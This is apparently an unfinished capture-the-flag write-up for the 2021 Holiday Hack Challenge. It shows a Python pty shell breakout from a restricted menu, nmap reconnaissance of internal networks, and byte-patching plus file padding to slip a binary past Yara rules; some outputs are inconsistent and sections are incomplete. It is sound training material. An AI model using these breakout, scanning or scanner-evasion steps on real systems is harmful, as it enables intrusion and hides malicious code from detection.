> Learn about Kerberoasting to leverage domain credentials to get usernames and crackable hashes for service accounts.
> 
> From: Eve Snowshoes
> Objective: 8) Kerberoasting on an Open Fire
> There will be some 10.X.X.X networks in your routing tables that may be interesting. Also, consider adding -PS22,445 to your nmap scans to "fix" default probing for unprivileged scans.


Obtain the secret sleigh research document from a host on the Elf University domain. What is the first secret ingredient Santa urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the ElfU Portal. Find Eve Snowshoes in Santa's office for hints.

We can access this here:
https://register.elfu.org/register


ElfU Registration Portal
New Student Domain Account Creation Successful!
You can now access the student network grading system by SSH'ing into this asset using the command below:

ssh guwjbhbfzr@grades.elfu.org -p 2222

ElfU Domain Username: guwjbhbfzr
ElfU Domain Password: Uscyoucpa@



So we have a few domains showing up for this:

register.elfu.org


nmap shows open ports for this but nothing interesting. 

It must just be a signup page to give us access to the actual challenge.


grades.elfu.org

This provides us with ssh access on port 2222. 

nmap scan shows:

	root@kali:~# nmap -sV grades.elfu.org
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-23 15:48 GMT
	Nmap scan report for grades.elfu.org (34.69.96.229)
	Host is up (0.053s latency).
	rDNS record for 34.69.96.229: 229.96.69.34.bc.googleusercontent.com
	Not shown: 999 filtered tcp ports (no-response)
	PORT     STATE SERVICE VERSION
	2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 42.45 seconds

Nothing interesting.


Connecting on port 2222 we are put into what seems to be a menu driven program. We can check grades for elves or we can exit. One class is for escaping vim, so perhaps this is a case of us needing to escape the menu driven program?

After trying a few things I started mashing escape...and we got something interesting!

The above got me nowhere, but after trying all of the obvious routes I eventually found some lick with CTRL+D!

Now it looks like we're in a Python command shell! Using exit() kills out connection, so it looks like we'll have to spawn a shell in the Python environment.

After breaking out of the menu we can use the classic Python method of using pty to get a more comfortable shell:


	===================================================
	=      Elf University Student Grades Portal       =
	=          (Reverts Everyday 12am EST)            =
	===================================================
	1. Print Current Courses/Grades.
	e. Exit
	: Traceback (most recent call last):
	  File "/opt/grading_system", line 41, in <module>
	    main()
	  File "/opt/grading_system", line 26, in main
	    a = input(": ").lower().strip()
	EOFError
	>>> import pty
	>>> pty.spawn("/bin/bash")
	guwjbhbfzr@grades:~$ 
	guwjbhbfzr@grades:~$ ls
	guwjbhbfzr@grades:~$ whoami
	guwjbhbfzr
	guwjbhbfzr@grades:~$ pwd
	/home/guwjbhbfzr
	guwjbhbfzr@grades:~$ ifconfig
	eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
	        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
	        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
	        RX packets 2027782  bytes 269254689 (269.2 MB)
	        RX errors 0  dropped 0  overruns 0  frame 0
	        TX packets 2283760  bytes 392015372 (392.0 MB)
	        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
	
	lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
	        inet 127.0.0.1  netmask 255.0.0.0
	        loop  txqueuelen 1000  (Local Loopback)
	        RX packets 1714976  bytes 86258310 (86.2 MB)
	        RX errors 0  dropped 0  overruns 0  frame 0
	        TX packets 1714976  bytes 86258310 (86.2 MB)
	        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
	
	guwjbhbfzr@grades:~$

Cool, so we have a Linux environment, no files sitting in the home directory, and we have an IP of 172.17.0.2 on eth0.

There are no processes running, and going by the IP I think we're actually in a container. I'm not sure if this is relevant (container escape?) but lets start with a scan of the 172.17.0.0/24 network and see if there's anything else here...

	guwjbhbfzr@grades:~$ nmap -sn 172.17.0.0/24
	Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-24 16:30 UTC
	Nmap scan report for 172.17.0.1
	Host is up (0.00060s latency).
	Nmap scan report for grades.elfu.local (172.17.0.2)
	Host is up (0.00044s latency).
	Nmap scan report for 172.17.0.3
	Host is up (0.00039s latency).
	Nmap scan report for 172.17.0.4
	Host is up (0.00030s latency).
	Nmap scan report for 172.17.0.5
	Host is up (0.00025s latency).
	Nmap done: 256 IP addresses (5 hosts up) scanned in 2.92 seconds
	guwjbhbfzr@grades:~$ 


Ok, lets check each of these individually, starting with us!

	guwjbhbfzr@grades:~$ netstat -lnpt
	Active Internet connections (only servers)
	Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
	tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
	tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
	tcp6       0      0 :::22                   :::*                    LISTEN      -                   
	guwjbhbfzr@grades:~$ 


We're running a web server! Interesting!

**172.17.0.1**

	guwjbhbfzr@grades:~$ nmap -sV 172.17.0.1
	Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-24 16:35 UTC
	Nmap scan report for 172.17.0.1
	Host is up (0.00022s latency).
	Not shown: 997 closed ports
	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	80/tcp   open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
	2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 6.48 seconds


Looks to be the same as our host, has ssh and a web server.

**172.17.0.3**

	guwjbhbfzr@grades:~$ nmap -sV 172.17.0.3
	Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-24 16:40 UTC
	Nmap scan report for 172.17.0.3
	Host is up (0.00027s latency).
	Not shown: 998 closed ports
	PORT    STATE SERVICE     VERSION
	139/tcp open  netbios-ssn Samba smbd 4.6.2
	445/tcp open  netbios-ssn Samba smbd 4.6.2
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 11.48 seconds

Ok, something different! 

**172.17.0.4**

	guwjbhbfzr@grades:~$ nmap -sV 172.17.0.4
	Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-24 16:41 UTC
	 Nmap scan report for 172.17.0.4
	 Host is up (0.00039s latency).
	Not shown: 988 closed ports
	 PORT     STATE SERVICE      VERSION
	 42/tcp   open  nameserver?
	53/tcp   open  domain       (generic dns response: NOTIMP)
	88/tcp   open  kerberos-sec Heimdal Kerberos (server time: 2021-12-24 16:42:02Z)
	135/tcp  open  msrpc        Microsoft Windows RPC
	139/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: ELFU)
	389/tcp  open  ldap         (Anonymous bind OK)
	445/tcp  open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: ELFU)
	464/tcp  open  kpasswd5?
	636/tcp  open  ssl/ldap     (Anonymous bind OK)
	1024/tcp open  msrpc        Microsoft Windows RPC
	3268/tcp open  ldap         (Anonymous bind OK)
	3269/tcp open  ssl/ldap     (Anonymous bind OK)
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port53-TCP:V=7.80%I=7%D=12/24%Time=61C5F85F%P=x86_64-pc-linux-gnu%r(DNS
	SF:VersionBindReqTCP,2B,"\0\)\0\x06\x81\x80\0\x01\0\0\0\0\0\x01\x07version
	SF:\x04bind\0\0\x10\0\x03\0\0\)\x02\0\0\0\0\0\0\0")%r(DNSStatusRequestTCP,
	SF:E,"\0\x0c\0\0\x90\x04\0\0\0\0\0\0\0\0");
	Service Info: Host: SHARE30; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 54.05 seconds

What the hell is all this. Going by the services here this might be a domain controller?

**172.17.0.5**

	guwjbhbfzr@grades:~$ nmap -sV 172.17.0.5
	Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-24 16:43 UTC
	Nmap scan report for 172.17.0.5
	Host is up (0.00027s latency).
	Not shown: 998 closed ports
	PORT    STATE SERVICE     VERSION
	139/tcp open  netbios-ssn Samba smbd 4.6.2
	445/tcp open  netbios-ssn Samba smbd 4.6.2
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 11.47 seconds

This looks to be similar to 172.17.0.3...

Now I reran the above acans with the -PS22,445 addition to the command suggested in the hints, but didn't notice any difference.

The hints also suggested checking the routing table, so lets do that:

	guwjbhbfzr@grades:~$ ip route
	default via 172.17.0.1 dev eth0 
	10.128.1.0/24 via 172.17.0.1 dev eth0 
	10.128.2.0/24 via 172.17.0.1 dev eth0 
	10.128.3.0/24 via 172.17.0.1 dev eth0 
	172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2 

Interesting...so we do indeed have some other networks here!

Lets scan that first network 10.128.1.0/24

	guwjbhbfzr@grades:~$ nmap -sn -PS22,445 10.128.1.0/24
	Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-24 17:00 UTC
	Nmap scan report for hhc21-windows-linux-docker.c.holidayhack2021.internal (10.128.1.4)
	Host is up (0.00027s latency).
	Nmap scan report for hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53)
	Host is up (0.0015s latency).
	Nmap done: 256 IP addresses (2 hosts up) scanned in 3.02 seconds


Ok, we have 2 hosts here; 

**10.128.1.4**

	guwjbhbfzr@grades:~$ nmap -sV -PS22,445 10.128.1.4
	Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-24 17:03 UTC
	Nmap scan report for hhc21-windows-linux-docker.c.holidayhack2021.internal (10.128.1.4)
	Host is up (0.00020s latency).
	Not shown: 997 closed ports
	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	80/tcp   open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
	2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds

This looks to be similar to our host and some of the other hosts we saw...

**10.128.1.53**

	guwjbhbfzr@grades:~$ nmap -sV -PS22,445 10.128.1.53
	Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-24 17:03 UTC
	Nmap scan report for hhc21-windows-dc.c.holidayhack2021.internal (10.128.1.53)
	Host is up (0.00059s latency).
	Not shown: 988 filtered ports
	PORT     STATE SERVICE           VERSION
	53/tcp   open  domain?
	88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2021-12-24 17:03:59Z)
	135/tcp  open  msrpc             Microsoft Windows RPC
	139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
	389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: elfu.local0., Site: Default-First-Site-Name)
	445/tcp  open  microsoft-ds?
	464/tcp  open  kpasswd5?
	593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
	636/tcp  open  ldapssl?
	3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: elfu.local0., Site: Default-First-Site-Name)
	3269/tcp open  globalcatLDAPssl?
	3389/tcp open  ms-wbt-server     Microsoft Terminal Services
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port53-TCP:V=7.80%I=7%D=12/24%Time=61C5FD84%P=x86_64-pc-linux-gnu%r(DNS
	SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
	SF:\x04bind\0\0\x10\0\x03");
	Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 147.41 seconds






**Moving Forward**

Ok, so we have a few hosts running various services. I'm guessing that these are all containers. We hyave a domain controller at 172.17.0.4. Going by the hints and the challenge it looks like we'll have to find some domain credentials to then gain access to something (possable a file server on 172.17.0.3 or .5?).

Now 





## Objective 9) Splunk!

***Hints from Fritzy Shortstack***

> GitHub Monitoring in Splunk \
> From: Fitzy Shortstack \
> Objective: 9) Splunk! \
> Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add, git status, and git commit. \
> 	
> Sysmon Monitoring in Splunk \
> From: Fitzy Shortstack \
> Objective: 9) Splunk! \
> Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. \
> 	
> Malicious NetCat?? \
> From: Fitzy Shortstack \
> Objective: 9) Splunk! \
> Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd, for example. \



## Objective 10) Now Hiring!

## Objective 11) Customer Complaint Analysis


***Hints from Tinsel Upatree***

> Evil Bit RFC
> From: Tinsel Upatree
> Objective: 11) Customer Complaint Analysis
> RFC3514 defines the usage of the "Evil Bit" in IPv4 headers.
> 
> Wireshark Display Filters
> From: Tinsel Upatree
> Objective: 11) Customer Complaint Analysis
> Different from BPF capture filters, Wireshark's display filters can find text with the contains keyword - and evil bits with ip.flags.rb.

## Objective 12) Frost Tower Website Checkup




# Cranberry Pi Terminals 

## Logic Munchers

Beat an intermediate stage in Potpourri and Noel Boetie will give you a hint related to the slot machine. There are no real tricks to this terminal. You just need to use logic to find the expressions that equate to True and CHOMP them.

***Hints Provided***\

	 Boolean Logic \
	 From: Noel Boetie \
	 Terminal: Logic Munchers \
	 There are lots of special symbols for logic and set notation. This one covers AND, NOT, and
	 OR at the bottom.
	
	 AND, OR, NOT, XOR \
	 From: Noel Boetie \
	 Terminal: Logic Munchers \
	 This might be a handy reference too. 
	
	 Intercepting Proxies \
	 From: Noel Boetie \
	 Objective: 4) Slot Machine Investigation \
	 Web application testers can use tools like Burp Suite or even right in the browser with > Firefox's Edit and Resend feature. 
	
	 Parameter Tampering \
	 From: Noel Boetie \
	 Objective: 4) Slot Machine Investigation \
	 It seems they're susceptible to parameter tampering.
	

## Grepping for Gold

Greasy GopherGuts needs help parsing some nmap output!

	 Howdy howdy!  Mind helping me with this homew- er, challenge? \
	 Someone ran nmap -oG on a big network and produced this bigscan.gnmap file. \
	 The quizme program has the questions and hints and, incidentally, \
	 has NOTHING to do with an Elf University assignment. Thanks! 

 Answer all the questions in the quizme executable: 
 - ***What port does 34.76.1.22 have open?***
	
> elf@fdc795b24c04:\~$ grep "34.76.1.22" bigscan.gnmap
> Host: 34.76.1.22 ()     Status: Up 
> Host: 34.76.1.22 ()     Ports: 62078/open/tcp//iphone-sync///      Ignored State: closed (999)
		
 - ***What port does 34.77.207.226 have open?*** \
   
>    elf@9345c1c30f60:\~$ grep "34.77.207.226" bigscan.gnmap \
>      Host: 34.77.207.226 ()     Status: Up
>      Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///      Ignored State: filtered (999)
	 
 - ***How many hosts appear "Up" in the scan?*** \
	
> 	elf@9345c1c30f60:\~$ grep "Status: Up" bigscan.gnmap | wc -l \
> 	26054
	
 - ***How many hosts have a web port open? (Let's just use TCP ports 80, 443, and 8080)***
 
> 	elf@c20c8b1f72ed:\~$ grep -E '(80/open|443/open|8080/open)' \ bigscan.gnmap| wc -l
> 	14372
	
 - ***How many hosts with status Up have no (detected) open TCP ports?*** \
 
> 	elf@c20c8b1f72ed:~$ grep "Ports" bigscan.gnmap | wc -l \
> 	25652 

> 	elf@c20c8b1f72ed:\~$ grep "tcp" bigscan.gnmap | wc -l \
> 	25652 

> 	elf@c20c8b1f72ed:\~$ grep "Status: Up" bigscan.gnmap | wc -l \
> 	26054
	
So there should only be 26054-25652 = 402 hosts with no open TCP ports.

 - ***What's the greatest number of TCP ports any one host has open?***

> elf@c20c8b1f72ed:\~$ grep -o -n 'tcp' bigscan.gnmap | cut -d : -f 1 | uniq -c | sort \
>  \<output\>

The above output has a long list of line numbers and the number of instaces of the string "tcp" on each line. Going by the contents of the file counting the instances of this string will let us understand how many tcp ports are open. Here we can see that there are 12 ports open on a few hosts. We can take one of the line numbers and verify this by manually counting them.

> elf@c20c8b1f72ed:~$ cat bigscan.gnmap | head -n 43460 | tail -n 1
> Host: 34.79.94.34 ()     Ports: 21/open/tcp//ftp///, 25/open/tcp//smtp///, 		80/open/tcp//http///, 110/open/tcp//pop3///, 135/open/tcp//msrpc///, 	137/open/tcp//netbios-ns///, 139/open/tcp//netbios-ssn///, 143/open/tcp//imap///, 445/open/tcp//microsoft-ds///, 993/open/tcp//imaps///, 995/open/tcp//pop3s///, 8080/open/tcp//http-proxy///      Ignored State: closed (988)

This most TCP ports open on hosts is 12.

 

***Hints Provided***


	Linux Wi-Fi Commands
	From: Greasy GopherGuts
	Objective: 3) Thaw Frost Tower's Entrance
	The iwlist and iwconfig utilities are key for managing Wi-Fi from the Linux command line.
	
	Web Browsing with cURL
	From: Greasy GopherGuts
	Objective: 3) Thaw Frost Tower's Entrance
	cURL makes HTTP requests from a terminal - in Mac, Linux, and modern Windows!
	
	Adding Data to cURL requests
	From: Greasy GopherGuts
	Objective: 3) Thaw Frost Tower's Entrance
	When sending a POST request with data, add --data-binary to your curl command followed by the data you want to send.



## Yara Analysis

I don't have any experience with Yara rules, so this will be fun!

> HELP!!!
> 
> This critical application is supposed to tell us the sweetness levels of our candy
> manufacturing output (among other important things), but I can't get it to run.
> 
> It keeps saying something something yara. Can you take a look and see if you
> can help get this application to bypass Sparkle Redberry's Yara scanner?
> 
> If we can identify the rule that is triggering, we might be able change the program
> to bypass the scanner.
> 
> We have some tools on the system that might help us get this application going:
> vim, emacs, nano, yara, and xxd
> 
> The children will be very disappointed if their candy won't even cause a single cavity.
> 


We can start by running the application to see what happens

 	snowball2@5f49774841e5:~$ ls
	 the_critical_elf_app  yara_rules
	 snowball2@5f49774841e5:~$ ./the_critical_elf_app 
	 yara_rule_135 ./the_critical_elf_app
 

Ok, so rule 135 might be causing some issues

We can open the file containing the Yara rules and take a look at the rules, particularly rule 135.


	snowball2@5f49774841e5:~$ nano yara_rules/rules.yar \ 


Rule 135 looks like this.


	rule yara_rule_135 { 
	   meta: 
	      description = "binaries - file Sugar_in_the_machinery" 
	      author = "Sparkle Redberry" 
	      reference = "North Pole Malware Research Lab" 
	      date = "1955-04-21" 
	      hash = "19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488" 
	   strings: 
	      $s = "candycane" 
	   condition: 
	      $s 
	} \


It looks like it's matching on a string "candycane"

We can see that this string does exist in the program using strings:

	snowball2@5f49774841e5:~$ strings the_critical_elf_app | grep "candycane"
candycane


Using xxd we can see the same and more:

	
	<more output>
	00002000: 0100 0200 0000 0000 6361 6e64 7963 616e  ........candycan \
	00002010: 6500 6e61 7567 6874 7920 7374 7269 6e67  e.naughty string \
	00002020: 0000 0000 0000 0000 5468 6973 2069 7320  ........This is  \
	00002030: 6372 6974 6963 616c 2066 6f72 2074 6865  critical for the \
	00002040: 2065 7865 6375 7469 6f6e 206f 6620 7468   execution of th \
	00002050: 6973 2070 726f 6772 616d 2121 0000 0000  is program!!.... \
	00002060: 486f 6c69 6461 7948 6163 6b43 6861 6c6c  HolidayHackChall \
	00002070: 656e 6765 7b4e 6f74 5265 616c 6c79 4146  enge{NotReallyAF \
	00002080: 6c61 677d 0064 6173 7461 7264 6c79 2073  lag}.dastardly s \
	00002090: 7472 696e 6700 0000 011b 033b 3c00 0000  tring......;<.. \
	<more output>
	

We can use sed to replace the bytes that make up the candycane string. In my case I replaced the first 4 bytes with the letter a. We want to make sure that we're replacing a long enough string that it won't cause issues anywhere else in the program.

We can check the output using this command:


	snowball2@5f49774841e5:~$ sed 's/\x63\x61\x6e\x64/\x61\x61\x61\x61/' the_critical_elf_app | xxd \

	<more output> \
	00002000: 0100 0200 0000 0000 6161 6161 7963 616e  ........aaaaycan \
	00002010: 6500 6e61 7567 6874 7920 7374 7269 6e67  e.naughty string \
	00002020: 0000 0000 0000 0000 5468 6973 2069 7320  ........This is  \
	00002030: 6372 6974 6963 616c 2066 6f72 2074 6865  critical for the \
	00002040: 2065 7865 6375 7469 6f6e 206f 6620 7468   execution of th \
	00002050: 6973 2070 726f 6772 616d 2121 0000 0000  is program!!.... \
	00002060: 486f 6c69 6461 7948 6163 6b43 6861 6c6c  HolidayHackChall \
	00002070: 656e 6765 7b4e 6f74 5265 616c 6c79 4146  enge{NotReallyAF \
	00002080: 6c61 677d 0064 6173 7461 7264 6c79 2073  lag}.dastardly s \
	00002090: 7472 696e 6700 0000 011b 033b 3c00 0000  tring......;<... \
	<more output>
	

...and then write it to the binary file:


	snowball2@5f49774841e5:~$ sed 's/\x63\x61\x6e\x64/\x61\x61\x61\x61/' the_critical_elf_app | xxd > the_critical_elf_app \
	snowball2@5f49774841e5:~$ ./the_critical_elf_app \
	snowball2@5f49774841e5:~$ \
	

Done...or not?

The binary ran but didn't work.. maybe we did break something after all!


	snowball2@48be1f28c3fe:~$ strings the_critical_elf_app | grep cand
	candycane
	candy_grabber 
	

Oh whoops! Ok, lets replace all the characters up to "candyc"

 
	snowball2@48be1f28c3fe:~$ sed 's/\x63\x61\x6e\x64\x79\x63/\x61\x61\x61\x61\x61\x61/' the_critical_elf_app | xxd > the_critical_elf_app
	snowball2@48be1f28c3fe:~$ ./the_critical_elf_app \
	snowball2@48be1f28c3fe:~$ \
	

It's still not working.... \

Ah yes! We're being silly with out redirections here. We aren't actually getting the binary data we want back into the file! \


	nowball2@70f40478cdcf:~$ sed -i 's/\x63\x61\x6e\x64\x79\x63/\x61\x61\x61\x61\x61\x61/' the_critical_elf_app \
	snowball2@70f40478cdcf:~$ strings the_critical_elf_app | grep candycandy_grabber
	snowball2@70f40478cdcf:~$ \
	snowball2@70f40478cdcf:~$ ./the_critical_elf_app  \
	yara_rule_1056 ./the_critical_elf_app \
	snowball2@70f40478cdcf:~$ \
	

Progression! Now we're getting caught on rule 1056. Lets check this out.


	rule yara_rule_1056 { \
	   meta:  \
	        description = "binaries - file frosty.exe" \
	        author = "Sparkle Redberry" \
	        reference = "North Pole Malware Research Lab" \
	        date = "1955-04-21" \
	        hash = "b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03" \
	    strings: \
	        $s1 = {6c 6962 632e 736f 2e36} \
	        $hs2 = {726f 6772 616d 2121} \
	    condition: \
	        all of them \
	} \
	


It looks like it's matching on two hex strings now. We should be able to use our previous method to replace these with something else. HOWEVER, if we check that the ascii representation of these hex strings are we can see that they're the following:

6c 6962 632e 736f 2e36		libc.so.6
726f 6772 616d 2121			rogram!!

Ok, so we should be able to replace that second one ok, but the first might be tricky. libc will be required by the binary...but maybe replacing it with libc.so.7 might work? Do we even need to replace both strings, or just one?



	snowball2@ba77eecbe3c0:~$ sed -i 's/\x63\x61\x6e\x64\x79\x63/\x61\x61\x61\x61\x61\x61/' the_critical_elf_app \
	snowball2@b903b707f09d:~$ sed -i 's/\x6c\x69\x62\x63\x2e\x73\x6f\x2e\x36/\x6c\x69\x62\x63\x2e\x73\x6f\x2e\x32/' the_critical_elf_app \
	snowball2@b903b707f09d:~$ ./the_critical_elf_app \
	yara_rule_1732 ./the_critical_elf_app \
	./the_critical_elf_app: error while loading shared libraries: libc.so.5: cannot open shared object file: No such file or directory \
	snowball2@b903b707f09d:~$ \
	

Ok...we progress to another Yara rule but the program can't find out alternate version of libc.

Lets go back and try changing "rogram!!" to somethign else...




	snowball2@ba77eecbe3c0:~$ sed -i 's/\x63\x61\x6e\x64\x79\x63/\x61\x61\x61\x61\x61\x61/' the_critical_elf_app \
	snowball2@ba77eecbe3c0:~$ sed -i 's/\x72\x6f\x67\x72\x61\x6d\x21\x21/\x72\x6f\x67\x72\x61\x6d\x​6d\x21/' the_critical_elf_app \
	snowball2@ba77eecbe3c0:~$ ./the_critical_elf_app  \
	Segmentation fault (core dumped) \
	snowball2@ba77eecbe3c0:~$ \
	


Segfault! Crap. Ok, lets pipe the output to xdd to see if we might be breaking something when we're replacing the string contents...

Ah yes. This section we previously looked at has a string that says it's critical!
 

	00002000: 0100 0200 0000 0000 6361 6e64 7963 616e  ........candycan \
	00002010: 6500 6e61 7567 6874 7920 7374 7269 6e67  e.naughty string \
	00002020: 0000 0000 0000 0000 5468 6973 2069 7320  ........This is  \
	00002030: 6372 6974 6963 616c 2066 6f72 2074 6865  critical for the \
	00002040: 2065 7865 6375 7469 6f6e 206f 6620 7468   execution of th \
	00002050: 6973 2070 726f 6772 616d 2121 0000 0000  is program!!.... \
	00002060: 486f 6c69 6461 7948 6163 6b43 6861 6c6c  HolidayHackChall  \ 
	00002070: 656e 6765 7b4e 6f74 5265 616c 6c79 4146  enge{NotReallyAF \
	00002080: 6c61 677d 0064 6173 7461 7264 6c79 2073  lag}.dastardly s \
	00002090: 7472 696e 6700 0000 011b 033b 3c00 0000  tring......;<... \
	


We can take their word for this and go back to modifying that libc string.

Now if we modify the version of libc being imported we do end up with an error, but another yara rule also catches the program. So maybe we're ok in chaging the version and moving on. We might have to come back to this. We might need to enumerate the versions available? I can't find obvious evidence of any other versions being available on the system.

Yara rule 1732 looks like this:


	rule yara_rule_1732 { \
	   meta: \
	      description = "binaries - alwayz_winter.exe" \
	      author = "Santa" \
	      reference = "North Pole Malware Research Lab" \
	      date = "1955-04-22" \
	      hash = "c1e31a539898aab18f483d9e7b3c698ea45799e78bddc919a7dbebb1b40193a8" \
	   strings: \
	      $s1 = "This is critical for the execution of this program!!" fullword ascii \
	      $s2 = "__frame_dummy_init_array_entry" fullword ascii \
	      $s3 = ".note.gnu.property" fullword ascii \
	      $s4 = ".eh_frame_hdr" fullword ascii \
	      $s5 = "__FRAME_END__" fullword ascii \
	      $s6 = "__GNU_EH_FRAME_HDR" fullword ascii \
	      $s7 = "frame_dummy" fullword ascii \
	      $s8 = ".note.gnu.build-id" fullword ascii \
	      $s9 = "completed.8060" fullword ascii \
	      $s10 = "_IO_stdin_used" fullword ascii \
	      $s11 = ".note.ABI-tag" fullword ascii \
	      $s12 = "naughty string" fullword ascii \
	      $s13 = "dastardly string" fullword ascii \
	      $s14 = "__do_global_dtors_aux_fini_array_entry" fullword ascii \
	      $s15 = "__libc_start_main@@GLIBC_2.2.5" fullword ascii \
	      $s16 = "GLIBC_2.2.5" fullword ascii \
	      $s17 = "its_a_holly_jolly_variable" fullword ascii \
	      $s18 = "__cxa_finalize" fullword ascii \
	      $s19 = "HolidayHackChallenge{NotReallyAFlag}" fullword ascii \
	      $s20 = "__libc_csu_init" fullword ascii \
	   condition: \
	      uint32(1) == 0x02464c45 and filesize < 50KB and \
	      10 of them \
	-- \
	      hash1 = "53ab4883cc1e84f1f1732bb2fdb97358490b9134156eedc516d6dde6b97018ba" \
	      hash2 = "02d1e6dd2f3eecf809d8cd43b5b49aa76c6f322cf4776d7b190676c5f12d6b45" \
	   strings: \
	      $s1 = "stub/stub.dll" fullword ascii \
	      $s2 = "stub/stub.dllPK" fullword ascii \
	      $s3 = "stub/EncryptedLoaderOld.class" fullword ascii \
	      $s4 = "stub/EncryptedLoader.class" fullword ascii \
	      $s5 = "stub/EncryptedLoaderOld.classPK" fullword ascii \
	      $s6 = "stub/EncryptedLoader.classPK" fullword ascii \
	      $s7 = "stub/EcryptedWrapper.class" fullword ascii \
	      $s8 = "stub/EcryptedWrapper.classPK" fullword ascii \
	   condition: \
	      ( uint16(0) == 0x4b50 and filesize < 400KB and ( all of them ) \
	      ) or ( all of them ) \
	} \


Right, so this looks a bit more complicated. Both conditions mention the file size. Could this be a way to avoid triggering these rules?

We can use wc to get the size of the current file:



	snowball2@1d1766e798f9:~$ wc -c < the_critical_elf_app \ 
	16688 \


So we have a little under 17KB. Based on the conditions in those rules it looks like something under 50KB for the first, and under 400KB for the second. Can we add padding to the file to increase it's size? Nullbytes or NOPs?

We can use dd to increase the size, and I found this nice command:

 
	snowball2@ec08e1e0f4df:~$ wc -c < the_critical_elf_app \ 
	16688 \
	snowball2@ec08e1e0f4df:~$ dd if=/dev/null  of=the_critical_elf_app bs=1 count=1 \ seek=16777215 \
	0+0 records in \
	0+0 records out \
	0 bytes copied, 3.1101e-05 s, 0.0 kB/s \
	snowball2@ec08e1e0f4df:~$ wc -c < the_critical_elf_app \ 
	16777215 \
	snowball2@ec08e1e0f4df:~$ \


And that's it!



	snowball2@ec08e1e0f4df:~$ wc -c < the_critical_elf_app \
	16688 \
	snowball2@ec08e1e0f4df:~$ dd if=/dev/null  of=the_critical_elf_app bs=1 count=1 seek=16777215 \
	0+0 records in \
	0+0 records out \
	0 bytes copied, 3.1101e-05 s, 0.0 kB/s \
	snowball2@ec08e1e0f4df:~$ wc -c < the_critical_elf_app  \
	16777215 \
	snowball2@ec08e1e0f4df:~$ sed -i 's/\x63\x61\x6e\x64\x79\x63/\x61\x61\x61\x61\x61\x61/' the_critical_elf_app \
	snowball2@ec08e1e0f4df:~$ sed -i 's/\x6c\x69\x62\x63\x2e\x73\x6f\x2e\x36/\x6c\x69\x62\x63\x2e\x73\x6f\x2e\x32/' the_critical_elf_app \
	snowball2@ec08e1e0f4df:~$ ./the_critical_elf_app \
	./the_critical_elf_app: error while loading shared libraries: libc.so.2: cannot open shared object file: No such file or directory \
	Machine Running..  \
